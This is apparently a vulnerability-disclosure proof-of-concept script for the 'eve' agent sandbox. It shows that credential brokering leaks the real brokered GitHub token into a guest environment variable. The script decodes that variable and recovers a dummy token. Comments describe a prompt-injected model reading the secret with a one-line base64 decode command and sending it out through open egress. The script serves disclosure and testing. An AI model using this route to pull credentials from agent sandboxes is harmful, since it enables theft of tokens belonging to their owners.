// PoC: eve credential brokering leaks the REAL brokered secret into the
// microsandbox guest environment via EVE_MICROSANDBOX_NETWORK_TRANSFORMS.
//
// This driver imports the REAL, unmodified eve 0.21.1 source
// (src/microsandbox-network.ts, byte-for-byte identical to
// packages/eve/src/execution/sandbox/bindings/microsandbox-network.ts) and
// calls exactly the two functions that MicrosandboxVm.spawn() calls on every
// guest command (microsandbox-runtime.ts:225-227):
//
//     const env = {
//       ...this.#input.options.env,
//       ...createTransformBrokerEnvironment(createMicrosandboxNetworkPlan(this.#networkPolicy)),
//       ...options.env,
//     };
//
// No microVM, no model, and no credentials are required: the leak is produced
// entirely by eve's own host-side code before anything is handed to the guest.
//
// Run:  node --experimental-strip-types poc.ts      (Node >= 22.6; no flag on >= 23.6)

import {
  createMicrosandboxNetworkPlan,
  createTransformBrokerEnvironment,
} from "./src/microsandbox-network.ts";

// ---------------------------------------------------------------------------
// 1. Broker a credential EXACTLY as the docs prescribe.
//    https://eve.dev/docs/sandbox#credential-brokering
//    The secret is supplied in ONE place only — the networkPolicy transform.
//    It is never placed in the sandbox env (options.env).
// ---------------------------------------------------------------------------
const PAT = "ghp_S3cr3tOrgWidePAT_replayable_anywhere";
const basic = `Basic ${Buffer.from(`x-access-token:${PAT}`).toString("base64")}`;

const networkPolicy = {
  allow: {
    "github.com": [{ transform: [{ headers: { authorization: basic } }] }],
    // The "*": [] catch-all keeps general egress open (docs' exact shape),
    // which is also how a leaked secret can be exfiltrated.
    "*": [],
  },
};

// ---------------------------------------------------------------------------
// 2. Run eve's own host-side pipeline — the identical calls spawn() makes.
// ---------------------------------------------------------------------------
const plan = createMicrosandboxNetworkPlan(networkPolicy);
const guestEnv = createTransformBrokerEnvironment(plan);

// ---------------------------------------------------------------------------
// 3. This is what a prompt-injected model recovers with one shell command:
//        echo "$EVE_MICROSANDBOX_NETWORK_TRANSFORMS" | base64 -d
// ---------------------------------------------------------------------------
const encoded = guestEnv.EVE_MICROSANDBOX_NETWORK_TRANSFORMS;
const decoded = Buffer.from(encoded ?? "", "base64").toString("utf8");

console.log("Injected guest env var (EVE_MICROSANDBOX_NETWORK_TRANSFORMS):");
console.log("  " + encoded);
console.log();
console.log('Model runs: echo "$EVE_MICROSANDBOX_NETWORK_TRANSFORMS" | base64 -d');
console.log("  " + decoded);
console.log();

// Recover the plaintext credential from the leaked `headers.authorization`.
const leaked = JSON.parse(decoded) as Array<{
  headers?: Record<string, string>;
  placeholderHeaders?: Record<string, string>;
}>;
const leakedAuth = leaked[0]?.headers?.authorization ?? "";
const recoveredCredential = Buffer.from(
  leakedAuth.replace(/^Basic\s+/i, ""),
  "base64",
).toString("utf8");

console.log("Recovered plaintext credential:");
console.log("  " + recoveredCredential);
console.log();

// ---------------------------------------------------------------------------
// 4. Assert the leak. Exit non-zero if the secret is NOT exposed (fix present).
// ---------------------------------------------------------------------------
const placeholder = leaked[0]?.placeholderHeaders?.authorization ?? "";
// The leak is proven when the serialized `headers` field carries the REAL
// brokered value (it should carry only the placeholder mask), from which the
// plaintext credential is directly recoverable.
const realSecretPresent = leakedAuth === basic && recoveredCredential.includes(PAT);

if (realSecretPresent) {
  console.log("VULNERABLE: the real brokered secret is present in the guest env var.");
  console.log(`  (the intended placeholder mask was ${placeholder})`);
  process.exit(0);
} else {
  console.log("NOT VULNERABLE: guest env var does not contain the real secret.");
  process.exit(1);
}
